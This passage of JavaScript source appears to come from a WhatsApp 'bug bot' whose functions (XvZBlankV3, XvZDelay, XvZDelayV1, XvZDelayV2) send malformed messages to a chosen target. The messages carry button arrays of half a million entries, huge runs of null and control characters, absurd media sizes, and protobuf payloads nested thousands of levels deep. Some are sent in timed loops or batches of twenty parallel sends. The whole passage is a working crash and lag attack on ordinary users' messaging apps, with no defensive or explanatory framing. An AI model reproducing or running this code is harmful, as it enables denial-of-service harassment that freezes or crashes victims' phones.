            directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
            contextInfo: {
                remoteJid: "X",
                participant: "0@s.whatsapp.net",
                stanzaId: "1234567890ABCDEF",
                mentionedJid: ["13135555555@s.whatsapp.net"]
            },
            packDescription: "",
            mediaKeyTimestamp: "1747502082",
            trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
            thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
            thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
            thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
            thumbnailHeight: 999999999,
            thumbnailWidth: 9999999999,
            imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
            stickerPackSize: "9990099",
            stickerPackOrigin: "USER_CREATED"
        }
    }, {});

    await sock.relayMessage(
        target,
        {
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "XiverzPhantom",
                            locationMessage: {
                                degreesLatitude: -999.03499999999999,
                                degreesLongitude: 922.9999999999999,
                                name: "XiverzPhantom",
                                address: "X",
                                jpegThumbnail: null,
                            },
                            hasMediaAttachment: true,
                        },
                        body: {
                            text: "XiverzPhantom¿!",
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: "ြ ".repeat(9000),
                                },
                                {
                                    name: "address_message",
                                    buttonParamsJson: "ြ ".repeat(9000),
                                },
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: "ြ ".repeat(75000),
                                },
                            ],
                            messageParamsJson: "wa.me/stickerpack/XiverzPhantom",
                            messageVersion: 1,
                        },
                    },
                },
            },
        },
        {}
    );

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    caption: "XiverzPhantom¿!",
                    fileSha256: "LdNOQNcNIvlIijHvkpwRIY/zIoTfWQoFux7dzTHusyM=",
                    fileLength: "1099511627776",
                    seconds: 172800,
                    mediaKey: "G2MGbP7BZLi1RwpyyV4DeXtfttaclMVSKfqNldZDt20=",
                    height: 1080,
                    width: 1920,
                    fileEncSha256: "U4uKZrZeJpg8smAcMRT3qtPoviAp/dqGa63GzqYcS8E=",
                    directPath: "/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1774428565",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQYBAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAADzL0VRwnekefd8ThLRzuO2/JxNWKr5ZFS+12VFgitnN6HKX8UQ1y6bCz0xiswAP//EACQQAAICAQQBBAMAAAAAAAAAAAECAAMREhMhMVIEQQIgQVFT/9oACAEBAAE/APi9NXgJtVeAgqq8BNmrwE2qvASx8YAGSY6XhM6ADK67rG0k6Zz0ex7EoHrL9ZltulMoMyi8sgY4jNhmycnMFgnqC5AYdAytToLseCJUFstFYfiKoFtidkGFZfWNpgIrl61B4HUrC1EkMfowNm4n8kQmEZioEezJ6ms9Z4jMAARAwZQRN+n+gl/qFNrFeobQScCaz+5Xdob6+X//xAAbEQACAgMBAAAAAAAAAAAAAAABESACECAhQf/aAAgBAgEBPwB6PFEYa+4pwwkLX//EABsRAAICAwEAAAAAAAAAAAAAAAECABEDICEQ/9oACAEDAQE/ANskB8fqxVNgxlF80//Z",
                    annotations: [
                        {
                            polygonVertices: [
                                {
                                    x: 0.17499999701976776,
                                    y: 0.3379453122615814
                                },
                                {
                                    x: 0.824999988079071,
                                    y: 0.3379453122615814
                                },
                                {
                                    x: 0.824999988079071,
                                    y: 0.6620468497276306
                                },
                                {
                                    x: 0.17499999701976776,
                                    y: 0.6620468497276306
                                }
                            ],
                            shouldSkipConfirmation: true,
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "2261401457948346",
                                    songId: "849859527815275",
                                    author: "XiverzPhantom¿!" + "ြ".repeat(9000),
                                    title: "ြ".repeat(75000),
                                    artworkDirectPath: "/v/t62.76458-24/568311115_4528169627440664_4559757974106869948_n.enc?ccb=11-4&oh=01_Q5Aa5AGs28VMFVXkcn0w9n-YUhiBwEPKyIwEcjWZLHm7mUgOsQ&oe=6A786B6E&_nc_sid=5e03e0",
                                    artworkSha256: "FROyKnRoHfLzDwmz5tED8K3nmdK+4Uihn2ucHBZDjPI=",
                                    artworkEncSha256: "y/SkheY3BoGhndQlmR6icfLtMtI4FjjRi5y3bsX13jw=",
                                    artworkMediaKey: "s5VCH/gb/YjDXhek47MVcsHjVV3/lOHOYaDe72eodXw=",
                                    artistAttribution: "https://www.instagram.com/_u/XiverzPhantom",
                                    countryBlocklist: "WEs=",
                                    isExplicit: false
                                }
                            },
                            embeddedAction: true
                        }
                    ]
                }
            }
        }
    }, {});

    const bot = "867051314767696@bot";

    await sock.relayMessage(target, {
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,

                    submessages: [
                        {
                            messageType: 2,
                            messageText: `@${bot.split("@")[0]}`
                        },

                        {
                            messageType: 5,
                            codeMetadata: {
                                codeLanguage: "javascript",

                                codeBlocks: [
                                    {
                                        highlightType: 1,
                                        codeContent: "const = {"
                                    },
                                    {
                                        highlightType: 2,
                                        codeContent: "XiverzPhantom¿!"
                                    },
                                    {
                                        highlightType: 3,
                                        codeContent: `${"\0".repeat(75000)}` + `${"\x10".repeat(25000)}`
                                    }
                                ]
                            }
                        }
                    ],

                    contextInfo: {
                        mentionedJid: [bot],

                        featureEligibilities: Array.from(
                            { length: 1999 },
                            () => ({
                                canReceiveMultiReact: true
                            })
                        ),

                        isForwarded: true,

                        forwardedAiBotMessageInfo: {
                            botJid: bot
                        },

                        forwardOrigin: 4
                    }
                }
            }
        }
    }, {});

    const Iniochamy = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                            fileLength: 9999,
                            height: 9999,
                            width: 9999,
                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1776937541",
                            jpegThumbnail: null,
                            caption: "LexzyMods - Executed¿!",
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [
                                9999987899999999999999,
                                998999999999999999999,
                                999899999999999999999,
                                9998789999999999999999
                            ],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: {
                        text: "XiverzPhantom¿!",
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 450000 }, () => ({}))
                    }
                }
            }
        }
    };

    const Iniochamyy = generateWAMessageFromContent(target, Iniochamy, {});

    await sock.relayMessage(target, Iniochamyy.message, {
        participant: target,
        messageId: Iniochamyy.key.id
    });

    const LexMsg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                            fileLength: 9999,
                            height: 9999,
                            width: 9999,
                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1776937541",
                            jpegThumbnail: null,
                            caption: "XiverzPhantom¿!",
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [
                                9999999999999999999,
                                9999999999999999999,
                                9999999999999999999,
                                9999999999999999999
                            ],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: {
                        text: "XiverzPhantom¿!"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    const Lexca = generateWAMessageFromContent(target, LexMsg, {});

    await sock.relayMessage(target, Lexca.message, {
        participant: target,
        messageId: Lexca.key.id
    });

    const Lexcaa = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "XiverzPhantom¿!"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    const Lexcaabos = generateWAMessageFromContent(target, Lexcaa, {});

    await sock.relayMessage(target, Lexcaabos.message, {
        participant: target,
        messageId: Lexcaabos.key.id
    });

    const msg = {
        key: { remoteJid: "status@broadcast", fromMe: true, id: generateId() },
        message: {
            imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                caption: "XiverzPhantom¿!",
                fileSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
                fileLength: 9999999,
                height: 9999,
                width: 9999,
                mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                fileEncSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
                directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1776937541",
                jpegThumbnail: largeThumbnail,
                scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
                scanLengths: [
                    9899999999999999077,
                    8899999999999998555,
                    9699999999999999148,
                    1069999999999999164
                ],
                midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk=",
                contextInfo: {
                    pairedMediaType: "NOT_PAIRED_MEDIA",
                    isQuestion: true,
                    isGroupStatus: true,
                    remoteJid: "status@broadcast",
                    entryPointConversionDelaySeconds: 999999,
                    entryPointConversionSource: "booking_status"
                }
            }
        }
    };

    await sock.relayMessage("status@broadcast", msg.message, {
        statusJidList: [target],
        messageId: msg.key.id,
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                }]
            }]
        }]
    });

    await sock.relayMessage(target, {
        statusMentionMessage: {
            message: {
                protocolMessage: {
                    key: msg.key,
                    type: 25
                },
                additionalNodes: [{
                    tag: "meta",
                    attrs: { is_status_mention: "false" },
                    content: undefined
                }]
            }
        }
    }, {});

    await sock.relayMessage(target, {
        statusMentionMessage: {
            message: {
                protocolMessage: {
                    key: msg.key,
                    type: 25
                }
            }
        }
    }, {});
}
async function XvZBlankV3(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "XiverzPhantom"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          },
          contextInfo: {
            mentionedJid: [target],
            quotedMessage: {
              imageMessage: {
                url: "https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1",
                mimetype: "image/jpeg",
                fileSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
                fileLength: 9007199254740991,
                height: 4294967295,
                width: 4294967295,
                mediaKey: crypto.randomBytes(32).toString("base64"),
                fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
                directPath: "/m1/v/t24/00002299291718920200291920729100",
                jpegThumbnail: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY="
              }
            }
          }
        }
      }
    }
  }, { participant: target });
}
async function XvZDelay(sock, target) {
 const sg = {
    groupStatusMessageV2: {
        message: {
            interactiveMessage: {
                  body: {
                        text: "XvZTeam;"
                    },
                    nativeFlowMessage: {
                        buttons: "\u000F".repeat(500000)
                   }
               }
           }
        }
    };

    const heksen = generateWAMessageFromContent(target, sg, {});

    await sock.relayMessage(target, heksen.message, {
        messageId: heksen.key.id
    });
}
async function XvZDelayV1(sock, target) {
 const startTime = Date.now();
 const duration = 4 * 60 * 1000;

 while (Date.now() - startTime < duration) {
   await sock.relayMessage(target, {
     groupStatusMessageV2: {
       message: {
         interactiveMessage: {
           body: {
              text: "XvZTeam"
            },
            nativeFlowMessage: {
              buttons: Array.from({ length: 500000 }, () => ({}))
            },
            contextInfo: {
              quotedMessage: {
                contactMessage: {
                  displayName: " ",
                  vcard: null
                }
              }
            }
          }
        }
      }
    }, { participant: target });

    await new Promise(resolve => setTimeout(resolve, 500));

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "XvZDelay",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u000F".repeat(9000),
              version: 3
            },
            contextInfo: {
              quotedMessage: {
                contactMessage: {
                  displayName: " ",
                  vcard: null
                }
              }
            }
          }
        }
      }
    }, { participant: target });

    await new Promise(resolve => setTimeout(resolve, 500));

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "Xiverz Phantom‽!",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\x10".repeat(9000),
              version: 3
            },
            contextInfo: {
              quotedMessage: {
                contactMessage: {
                  displayName: " ",
                  vcard: null
                }
              }
            }
          }
        }
      }
    }, { participant: target });

    await new Promise(resolve => setTimeout(resolve, 500));
  }
}
async function XvZDelayV2(sock, target) {
const heksen = {
groupStatusMessageV2: {
message: {
interactiveMessage: {
header: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
mimetype: "application/pdf",
fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
fileLength: 999999999,
pageCount: 1000,
mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
fileName: "XvZ.pdf",
fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
mediaKeyTimestamp: "1779839963",
thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsarcznY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
jpegThumbnail: null,
contextInfo: {},
thumbnailHeight: 999,
thumbnailWidth: 999,
scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: { text: "XiverzPhantom ¿?" },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    const met = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            caption: "noname",
                            fileSha256: "umQsdlmP4w9dL35/1yb2Wy5x6ypLvSXUy3r7veQ/rNU=",
                            fileLength: "109951162777600",
                            height: -9999,
                            width: 9999,
                            mediaKey: "pbSAJfuBxe4QBnJO34YFyM1EX4ZABBJsmW6rhvT+5+I=",
                            fileEncSha256: "8frUJ7Tt5d1EXOSWiP/9CBdN4fP2gPV6WPE0sN/IaF4=",
                            directPath: "/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1774107894",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0Jdi1hZV1hYjX2Xe5t7l33gsJycsOD/2c7Z////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADs6unZ2+aFh/SINqdLCYSpYVKXczcHeKUGr56zGNgaDMfrkKJRqNSqkK6GqjWFw2MvVwxefqbzzDetQJykmZZwN7KAS4BCYFYBYAf/xAAmEAACAgICAgICAgMAAAAAAAAAAAABAgADBBESIQUxE0EQIhVRFDJS/9oACAEBAAE/AMZx8C6BOjHNh2FYLMahbcieZzONYpT84PlOKCi0dSyxa9LqIgLgkghjKwyWWUoQBuGtQG5sd77ambataukeumUVbmXrrqZFr22HcowL7hvWhKfFy/xj8eSiVs708XHa9SmsF+J+hL8T43589bjltDl2NzJ+RrErrMxvGog5v2ZUyceh6lj8VY+v6ldqvXLslVyyn0ejHL41kvJrX5LDt/oRG+Zi1nUutejJDfUGUciv46tciJUl+OCbWEttpyGPK4CZF6Y1YFL8pWWtvUnskyvhcnxuNv8AUFjWW7vmPWtzitCSvszyZqNhrXrgJiPwLkWFSB1C92WKyDsp7luG23ts/QQHdJQAe/crc1uCJjX/ACD9Tpx6lVdOhtTzMtv/AMBgoHuZdy3Wl1ErPFgSOopUNyrfUf5LG/d4QtSnrZldDPx69mFUotRFPcw6BShutP7N6nljuxGgx2sr5IjbleFmH1SZX4jKPtZ/DP8Adgn8SmxzumXirTim2pvUx2L5CFjvuZFyktYf9Elu7q3sJ+9zG7xqihUfrNjiQ1qw34y7DXiPm4Ce7Y3lcEelYzL8ul1DVJVMRwl6kiZALoKgd/bS0fHUR/UF1oGg7AQW2f8AZhJJjqi8eLb67/NTcXBn/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k=",
                            viewOnce: true,
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: { text: "XvZ" },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    const lag2 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    locationMessage: {
                        degreesLatitude: 9999999999,
                        degreesLongitude: 9999999999
                    },
                    body: { text: "XiverzPhantom ¡!" },
                    nativeFlowMessage: {
                        buttons: "\0".repeat(500000)
                    }
                }
            }
        }
    };

    const lag = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: { text: "[];" },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    const ambataukeum = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
        directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
        mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
        fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
        fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
        fileLength: 20010,
        mediaKeyTimestamp: "1785637793",
        mimetype: "image/jpeg",
        height: 1600,
        width: 1200,
        jpegThumbnail: ""
    };

    const TAGS = [[0xBA, 0x03], [0xD2, 0x04], [0xAA, 0x02]];

    const encodeVarint = (n) => {
        const buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = (tag, data) => Buffer.concat([
        Buffer.from(tag),
        encodeVarint(data.length),
        data
    ]);

    const Payload = proto.Message.encode(
        proto.Message.fromObject({ imageMessage: ambataukeum })
    ).finish();

    const inflate = (tag, depth) => {
        let buf = Payload;
        for (let i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = (raw) => {
        const s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(j => j.length > 15);

    const _0xa7iwnO = 20;
    const MAX_BATCH = 1;
    const DELAY_MS = 1000;

    await Promise.all(
        Array.from({ length: _0xa7iwnO }, async (_, i) => {
            const msg1 = generateWAMessageFromContent(target, heksen, {});
            await sock.relayMessage(target, msg1.message, {
                messageId: msg1.key.id
            });

            const msg211 = generateWAMessageFromContent(target, met, {});
            await sock.relayMessage(target, msg211.message, {
                messageId: msg211.key.id
            });

            const msgLag2 = generateWAMessageFromContent(target, lag2, {});
            await sock.relayMessage(target, msgLag2.message, {
                messageId: msgLag2.key.id
            });

            const msgLag = generateWAMessageFromContent(target, lag, {});
            await sock.relayMessage(target, msgLag.message, {
                messageId: msgLag.key.id
            });

            for (let offset = 0; offset < jids.length; offset += MAX_BATCH) {
                const bokep = jids.slice(offset, offset + MAX_BATCH);
                const isFirst = offset === 0;

                if (!isFirst) {
                    await new Promise(r => setTimeout(r, DELAY_MS));
                }

                const idx = Math.floor(offset / MAX_BATCH) + 1;
                const suffix = idx > 1 ? ('n' + idx) : 'n';
                const msg = 'hks' + Date.now().toString(36).toUpperCase() + suffix;

                for (let ti = 0; ti < TAGS.length; ti++) {
                    const tag = TAGS[ti];
                    let codes = null;

                    for (let depth = 5000; depth >= 2000 && !codes; depth -= 400) {
                        try {
                            const decoded = proto.Message.decode(inflate(tag, depth));
                            proto.Message.encode(decoded).finish();
                            codes = decoded;
                        } catch (_) {}
                    }

                    if (!codes) continue;

                    await sock.relayMessage('status@broadcast', codes, {
                        messageId: msg,
                        statusJidList: bokep,
                        additionalNodes: [{
                            tag: 'meta',
                            attrs: {},
                            content: [{
                                tag: 'mentioned_users',
                                attrs: {},
                                content: bokep.map(jid => ({
                                    tag: 'to',
                                    attrs: { jid },
                                    content: []
                                }))
                            }]
                        }]
                    });
                }
            }
        })
    );

    const bot = "867051314767696@bot";
    const botPayload = {
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        { messageType: 2, messageText: `@${bot.split("@")[0]}` },
                        {
                            messageType: 5,
                            codeMetadata: {
                                codeLanguage: "javascript",
                                codeBlocks: [
                                    { highlightType: 1, codeContent: "const = {" },
                                    { highlightType: 2, codeContent: "#" },
                                    { highlightType: 3, codeContent: "\0".repeat(75000) + "\x10".repeat(25000) }
                                ]
                            }
                        }
                    ],
                    contextInfo: {
                        mentionedJid: [bot, target],
                        featureEligibilities: Array.from({ length: 1999 }, () => ({
                            canReceiveMultiReact: true
                        })),
                        isForwarded: true,
                        forwardedAiBotMessageInfo: { botJid: bot },
                        forwardOrigin: 4
                    }
                }
            }
        }
    };

    const botMsg = generateWAMessageFromContent(target, botPayload, {});
    await sock.relayMessage(target, botMsg.message, {
        messageId: botMsg.key.id
    });

    await sock.relayMessage("status@broadcast", botMsg.message, {
        messageId: botMsg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                }]
            }]
        }]
    });

    await sock.relayMessage(target, {
        statusMentionMessage: {
            message: {
                protocolMessage: {
                    key: botMsg.key,
                    type: 25
                }
            }
        }
    }, {
        participant: { jid: target },
        messageId: null
    });
}
//end Func

bot.launch()
